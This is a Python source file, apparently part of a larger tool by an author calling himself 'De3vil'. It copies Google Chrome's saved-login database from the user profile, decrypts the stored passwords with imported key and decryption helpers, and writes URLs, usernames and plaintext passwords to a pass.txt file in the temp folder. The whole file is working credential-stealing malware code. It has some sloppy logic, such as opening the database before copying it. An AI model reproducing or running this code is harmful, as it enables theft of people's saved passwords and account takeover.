# -*- coding: utf-8 '-*-'
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================

from modules_version2.Moud.GetKay import Encryption_key
from modules_version2.Moud.DecryptPass import DecryptPassword
from os import path
from sqlite3 import connect 
from shutil import copyfile
from os import path ,chdir , getenv , environ
from datetime import timezone, datetime, timedelta

class Main:
    def __init__(self):
        self.stored = ""
        self.filename = "ChromeData.db"
        self.EncryptionKey = Encryption_key()
        self.kay = self.EncryptionKey.get_encryption_key()
        self.db_path = path.join(environ["USERPROFILE"],
         "AppData", "Local",
         "Google", "Chrome",
         "User Data", "Default",
         "Login Data")
        self.connectToDB = connect(self.filename)
        self.copyfile_ = copyfile(self.db_path,self.filename)
        self.cursor = self.connectToDB.cursor()

    def get_chrome_datetime(self , chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    def main(self):
        try:
            self.cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        except:
            self.cursor.execute("SELECT action_url, username_value, password_value  from logins"
            )
        for row in self.cursor.fetchall():
            origin_url     = row[0]
            action_url     = row[1]
            username       = row[2]
            password       = DecryptPassword()
            passs          = password.decrypt_password(row[3] , key=self.kay)
            date_created   = row[4]
            date_last_used = row[5]        
            if username or password:
                paTh = chdir(environ["temp"])
                with open ("pass.txt" , mode="a" ,encoding="utf-8") as f:
                	f.writelines(str(f"Origin URL: {origin_url}")+"\n\n"+str(f"Action URL: {action_url}")+"\n\n"+str(f"Username: {username}")+"\n\n"+str(f"Password: {passs}")+"\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                p = f"Creation date: {str(self.get_chrome_datetime(date_created))}"
            
            if date_last_used != 86400000000 and date_last_used:
                pr = f"Last Used: {str(self.get_chrome_datetime(date_last_used))}"
        
        self.cursor.close()
        self.connectToDB.close()
